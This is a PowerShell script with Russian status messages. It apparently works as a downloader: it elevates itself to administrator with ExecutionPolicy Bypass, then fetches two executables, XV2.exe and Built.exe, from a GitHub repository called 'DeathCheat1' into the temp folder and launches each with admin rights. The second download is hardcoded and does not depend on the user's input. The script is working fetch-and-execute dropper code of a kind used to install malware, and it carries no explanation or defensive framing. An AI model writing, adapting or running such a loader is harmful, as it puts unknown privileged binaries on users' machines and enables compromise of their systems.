param(
    [Parameter(Mandatory=$true)]
    [string]$Url = "https://github.com/DeathCheat1/dgfhffd/raw/refs/heads/main/XV2.exe",
    [Parameter(Mandatory=$false)]
    [string]$DestinationPath,
    [Parameter(Mandatory=$false)]
    [string]$Arguments
)

function Ensure-AdminRights {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
   
    if (-not $isAdmin) {
        Write-Host "запрашиваю повышение прав..." -ForegroundColor Yellow
        $scriptPath = $MyInvocation.MyCommand.Path
        $scriptArgs = "-Url `"$Url`""
        if ($DestinationPath) { $scriptArgs += " -DestinationPath `"$DestinationPath`"" }
        if ($Arguments) { $scriptArgs += " -Arguments `"$Arguments`"" }
       
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $scriptArgs"
        $psi.Verb = "runas"
       
        try {
            [System.Diagnostics.Process]::Start($psi)
            exit
        }
        catch {
            Write-Host "ошибка запроса прав: $_" -ForegroundColor Red
            exit 1
        }
    }
    else {
        Write-Host "уже с правами администратора." -ForegroundColor Green
    }
}

function Download-File {
    param([string]$url, [string]$destPath)
   
    Write-Host "скачиваю $url ..." -ForegroundColor Cyan
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $destPath)
        Write-Host "со: $destPath" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
        return $false
    }
}

function Run-AsAdmin {
    param([string]$filePath, [string]$arguments)
   
    if (-not (Test-Path $filePath)) {
        Write-Host "Файл не найден: $filePath" -ForegroundColor Red
        return $false
    }
   
    Write-Host "запускаю от имени администратора: $filePath" -ForegroundColor Cyan
    try {
        $processArgs = @{
            FilePath = $filePath
            Verb = "runas"
            Wait = $false
        }
        if ($arguments) {
            $processArgs.ArgumentList = $arguments
        }
        Start-Process @processArgs
        Write-Host "Запущено." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка запуска: $_" -ForegroundColor Red
        return $false
    }
}

try {
    Ensure-AdminRights

    Write-Host "`n======" -ForegroundColor Magenta
    $firstDest = $DestinationPath
    if (-not $firstDest) {
        $fileName = [System.IO.Path]::GetFileName($Url)
        if (-not $fileName) { $fileName = "downloaded_file.exe" }
        $firstDest = Join-Path $env:TEMP $fileName
    }
   
    $downloadSuccess1 = Download-File -url $Url -destPath $firstDest
    if ($downloadSuccess1) {
        $runSuccess1 = Run-AsAdmin -filePath $firstDest -arguments $Arguments
        if (-not $runSuccess1) {
            Write-Host "не удалось запустить первый файл." -ForegroundColor Yellow
        }
    } else {
        Write-Host "не удалось скачать первый файл." -ForegroundColor Yellow
    }

    Write-Host "`n======" -ForegroundColor Magenta
    $secondUrl = "https://github.com/DeathCheat1/dgfhffd/raw/refs/heads/main/Built.exe"
    $secondFileName = [System.IO.Path]::GetFileName($secondUrl)
    if (-not $secondFileName) { $secondFileName = "Built.exe" }
    $secondDest = Join-Path $env:TEMP $secondFileName
    $secondArguments = ""

    $downloadSuccess2 = Download-File -url $secondUrl -destPath $secondDest
    if ($downloadSuccess2) {
        $runSuccess2 = Run-AsAdmin -filePath $secondDest -arguments $secondArguments
        if (-not $runSuccess2) {
            Write-Host "не удалось запустить второй файл." -ForegroundColor Yellow
        }
    } else {
        Write-Host "не удалось скачать второй файл." -ForegroundColor Yellow
    }

    Write-Host "`nГотово." -ForegroundColor Green
}
catch {
    Write-Host "Критическая ошибка: $_" -ForegroundColor Red
    exit 1
}
